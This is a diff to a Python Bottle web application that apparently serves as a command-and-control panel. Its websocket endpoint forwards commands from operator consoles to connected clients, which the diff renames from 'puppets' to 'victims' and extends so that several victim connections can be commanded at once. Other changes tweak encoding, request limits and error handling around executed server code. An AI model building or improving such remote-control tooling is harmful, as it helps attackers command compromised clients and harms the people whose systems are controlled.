@@ -19,8 +19,10 @@ from urlparse import urlparse
 from json import dumps, loads
 from random import random
 from bottle import route, error, get, post,\
-	static_file, request, template,\
+	static_file, request, template, BaseRequest,\
 	response, redirect, abort, run, app
+
+BaseRequest.MEMFILE_MAX = 1024 * 1024
 
 #	sqlite sqldb
 auser = sqlite3.connect('./data/auser.db')
@@ -70,7 +72,12 @@ def validate(types):
     return True
 
 def b64ens(u):
-    return b64encode(unicode(u))
+    try:
+        return b64encode(u)
+    except UnicodeEncodeError:
+        return b64encode(u.encode('utf8'))
+    except TypeError:
+        return b64encode(unicode(u))
 
 @get('/static/<filename:path>')
 @post('/static/<filename:path>')
@@ -297,6 +304,7 @@ def seeinfo(ids):
 def deletes(state, ids):
     if validate('login') or validate('token'):
         abort(404)
+    state = state.lower()
     idname = 'idsalt' if (state == 'object') else 'id'
     upkey = gum.select(state, ['upkey'], {idname:ids}).fetchone()
     if upkey and upkey != 'yes':
@@ -371,8 +379,8 @@ def ing():
             exec server
         except Exception as e:
             print 'ConfigError: server code error.'
-            print e
-            serverinfo['SERVER_CODE_ERROR'] = e
+            print unicode(e)
+            serverinfo['SERVER_CODE_ERROR'] = b64ens(e)
     if not updates:
 #        infoid = gums.execute("select id from info where upkey=?",
 #                ['yes']).fetchone()[0]
@@ -395,7 +403,7 @@ def ing():
     return returns
 
 consoles = {}
-puppets = {}
+victims = {}
 @get('/connect', apply=[websocket])
 @get('/home/connect', apply=[websocket])
 def connect(ws):
@@ -412,7 +420,10 @@ def connect(ws):
     if lineor:
         consoles[idsalt] = ws
     else:
-        puppets[idsalt] = ws
+        if not idsalt in victims:
+            victims[idsalt] = [ws]
+        else:
+            victims[idsalt].append(ws)
 #        gum.update('object', {'life':ctime()}, {'idsalt':idsalt})
 #        gum.commit()
     while True:
@@ -424,17 +435,23 @@ def connect(ws):
         if cmdinfo is not None:
             try:
                 if lineor:
-                    puppets[idsalt].send(cmdinfo)
+                    for v in victims[idsalt]:
+                        v.send(cmdinfo)
                 else:
-                    consoles[idsalt].send(escape(cmdinfo))
+                    u = unicode(ws)[-10:]
+                    consoles[idsalt].send(u + escape(cmdinfo))
             except KeyError as e:
                 consoles[idsalt].send(
                     escape('No User, {error}'.format(error=e)))
+            except WebSocketError as e:
+                consoles[idsalt].send(
+                    escape(u + ' {error}'.format(error=e)))
         else: break
-    if lineor:
-        del consoles[idsalt]
-    else:
-        del puppets[idsalt]
+    ws.close()
+#    if lineor:
+#        del consoles[idsalt]
+#    else:
+#        del victims[idsalt]
 
 @get('/home/console')
 def console():
